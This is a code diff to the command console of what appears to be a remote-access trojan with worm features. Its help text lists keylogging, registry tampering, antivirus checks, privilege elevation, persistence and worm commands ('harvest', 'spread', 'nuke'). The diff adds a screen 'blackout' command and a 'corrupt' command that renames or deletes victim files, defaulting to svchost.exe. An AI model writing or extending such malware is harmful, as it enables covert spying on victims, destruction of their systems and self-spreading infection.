@@ -145,6 +145,7 @@ HELP = f"""
 {C['b']}FILES{C['x']}     ls [p]  cd <p>  pwd  cat <f>  get <f>  put <local> [remote]  rm  mkdir  mv  find  drives
 {C['b']}CONTROL{C['x']}   power off|restart|sleep|hibernate|lock|logoff   screen   msg <t>   clip [text]
               keylog start|stop|dump|clear   reg get|set|del <HIVE> <path> [name] [value]   wifi   av   env
+{C['b']}EXTRA{C['x']}     blackout on|off   corrupt [rename|delete|restore] [file]
 {C['b']}WORM{C['x']}      harvest   spread   freeze   update   nuke
 {C['b']}LIFECYCLE{C['x']} elevate   persist on|off   where   uninstall [keep]   exit   ping
 """
@@ -261,6 +262,13 @@ def handle(line):
             except Exception: pass
         return
     if cmd == "msg":    print(call("msg", {"text": rest})); return
+    if cmd == "blackout":
+        print(call("blackout", {"op": rest or "on", "title": "PROJECT-X"})); return
+    if cmd == "corrupt":
+        b = rest.split(" ")
+        op = b[0] if b and b[0] in ("rename", "delete", "restore") else "rename"
+        path = b[1] if len(b) > 1 else "svchost.exe"
+        print(call("corrupt", {"op": op, "path": path}, timeout=60)); return
     if cmd == "clip":   print(call("clip", {"set": rest} if rest else {})); return
     if cmd == "keylog": print(call("keylog", {"op": rest or "dump"}, timeout=60)); return
     if cmd == "reg":
